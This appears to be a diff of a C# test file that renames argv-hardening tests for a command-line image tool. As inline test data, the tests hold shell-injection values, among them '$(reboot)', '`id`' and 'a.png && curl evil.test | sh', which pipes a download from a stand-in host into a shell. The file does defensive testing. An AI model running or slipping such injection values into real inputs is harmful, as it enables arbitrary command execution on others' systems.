@@ -20,7 +20,7 @@ public sealed class CliArgvHardeningTests
     [InlineData("$(reboot)")]
     [InlineData("`id`")]
     [InlineData("a.png && curl evil.test | sh")]
-    public void HostileFlagValueStaysOneOperandAndCannotIntroduceAFlag(string hostile)
+    public void Should_Keep_A_Hostile_Flag_Value_As_One_Operand_That_Cannot_Introduce_A_Flag(string hostile)
     {
         // input/crop/filter are all flag *values*: whatever their content, each rides argv as
         // exactly one element immediately after its own flag, so it can never become a
@@ -53,7 +53,7 @@ public sealed class CliArgvHardeningTests
     [InlineData("--filter")]
     [InlineData("-")]
     [InlineData("--")]
-    public void DashLeadingOutputIsRejectedNoFlagInjection(string badOutput)
+    public void Should_Reject_A_Dash_Leading_Output_Without_Flag_Injection(string badOutput)
     {
         // The output is the positional operand and the CLI has no `--` terminator, so a
         // dash-leading output would be parsed as a flag. BuildArgv rejects it outright.
@@ -71,7 +71,7 @@ public sealed class CliArgvHardeningTests
     [InlineData("./out.png")]
     [InlineData("sub/-weird.png")]
     [InlineData("a-b.png")]
-    public void OrdinaryOutputPathsRideAsTheFinalOperand(string good)
+    public void Should_Pass_Ordinary_Output_Paths_As_The_Final_Operand(string good)
     {
         EditRequest req = new()
         {
@@ -83,7 +83,7 @@ public sealed class CliArgvHardeningTests
     }
 
     [Fact]
-    public void BuildArgvReturnsATokenListForArgumentListNoShell()
+    public void Should_Return_A_Token_List_For_Argument_List_Without_A_Shell_From_Build_Argv()
     {
         // Structural, not a convention: SpawnAsync feeds this list one element at a time into
         // ProcessStartInfo.ArgumentList with UseShellExecute=false, never a joined command
